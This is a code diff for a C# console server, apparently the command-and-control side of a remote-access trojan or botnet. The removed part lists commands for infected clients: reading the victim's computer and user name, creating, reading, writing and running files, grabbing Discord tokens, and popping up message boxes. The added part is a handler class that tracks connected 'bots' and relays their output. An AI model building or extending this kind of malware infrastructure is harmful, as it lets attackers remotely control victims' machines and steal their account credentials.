@@ -1,94 +1,81 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
+using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
 using System.Threading;
 
 namespace Server
 {
-    class Server
+    public class ConnectedClient
     {
-        private static Dictionary<string, string> helpList = new Dictionary<string, string>(){
-            {"stop", "stops server"},
-            {"beep", "makes client beep"},
-            {"getname", "returns clients computer/username"},
-            {"file", "arguments: create <path>, read <path>, write <path> <text>, run <path>"},
-            //{"getpath", "arguments: desktop, appdata"},
-            {"gettoken", "arguments: discord"},
-            { "msg", "shows a messagebox, arguments: <your message>"}
-        };
+        public TcpClient Client { get; set; }
+        public Thread ClientThread { get; set; }
+        public NetworkStream Stream { get; set; }
+        public bool IsRunning { get; set; }
 
-        public static TCPServer server = new TCPServer();
-
-        static void Main(String[] args)
+        public ConnectedClient(TcpClient client)
         {
-            Console.Title = $"Server (Bot Count: 0)";
+            Client = client;
+            Stream = client.GetStream();
+            IsRunning = true;
 
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine(@"   ._________________.
-   |.---------------.|
-   ||               ||
-   ||   -._ .-.     ||
-   ||   -._| | |    ||
-   ||   -._|`|`|    ||
-   ||   -._|.-.|    ||
-   || ______________||
-   /.-.-.-.-.-.-.-.-.\
-  /.-.-.-.-.-.-.-.-.-.\
- /.-.-.-.-.-.-.-.-.-.-.\
-/ ______ / _______\___o_\
-\_______________________/");
-            Console.WriteLine("\nWelcome To The Control Center");
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("Type 'help' for a list of commands...\n");
-            Console.ForegroundColor = ConsoleColor.White;
+            ClientThread = new Thread(HandleClient);
+            ClientThread.Start();
+        }
 
-            new Thread(() =>
+        public void HandleClient()
+        {
+            try
             {
-                server.StartServer();
-            }).Start();
+                byte[] buffer = new byte[1024];
+                int bytesRead;
 
-            string input;
-            do
-            {
-                if (server.serverStarted == true)
+                while ((bytesRead = Stream.Read(buffer, 0, buffer.Length)) > 0)
                 {
+                    IPEndPoint remoteIpEndPoint = Client.Client.RemoteEndPoint as IPEndPoint;
+
+                    string data = Encoding.ASCII.GetString(buffer, 0, bytesRead);
+                    Console.ForegroundColor = ConsoleColor.Yellow;
+                    Console.WriteLine("\r" + data);
+                    Console.ForegroundColor = ConsoleColor.White;
 
                     Console.Write("\r> ");
-                    input = Console.ReadLine();
-
-                    if (input.Trim().ToUpper() == "STOP")
-                    {
-                        break;
-                    }
-                    if (input.ToLower() == "help")
-                    {
-                        Console.Write("List of Commands: ");
-                        for (int i = 0; i < helpList.Count; i++)
-                        {
-                            Console.ForegroundColor = ConsoleColor.Magenta;
-                            Console.Write("\nCommand: ");
-                            Console.ForegroundColor = ConsoleColor.White;
-                            Console.Write(helpList.ElementAt(i).Key);
-                            Console.ForegroundColor = ConsoleColor.Magenta;
-                            Console.Write(" Info: ");
-                            Console.ForegroundColor = ConsoleColor.White;
-                            Console.Write($"{helpList.ElementAt(i).Value}");
-                        }
-                        Console.WriteLine();
-                    }
-                    else
-                    {
-                        server.SendToAllClients(input);
-                    }
+                    //receive
+                    //byte[] responseBuffer = Encoding.ASCII.GetBytes(data);
+                    //Stream.Write(responseBuffer, 0, responseBuffer.Length);
                 }
-            } while (true);
+                Console.ForegroundColor = ConsoleColor.DarkYellow;
+                Console.WriteLine("\rClient disconnected.");
+                Console.ForegroundColor = ConsoleColor.White;
 
-            server.StopServer();
+                Server.server.connectedClients.Remove(this);
+                Console.Title = $"Server (Bot Count: {Server.server.connectedClients.Count})";
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("An error occurred: " + ex.Message);
+                Server.server.connectedClients.Remove(this);
+                Console.Title = $"Server (Bot Count: {Server.server.connectedClients.Count})";
+
+                Console.Write("\r> ");
+            }
+            finally
+            {
+                Cleanup();
+            }
+        }
+
+        public void SendData(string data)
+        {
+            byte[] buffer = Encoding.ASCII.GetBytes(data);
+            Stream.Write(buffer, 0, buffer.Length);
+        }
+
+        public void Cleanup()
+        {
+            IsRunning = false;
+            Stream.Close();
+            Client.Close();
         }
     }
 }
-/*
-            new Thread(() =>
-            {
-            }).Start();
-*/
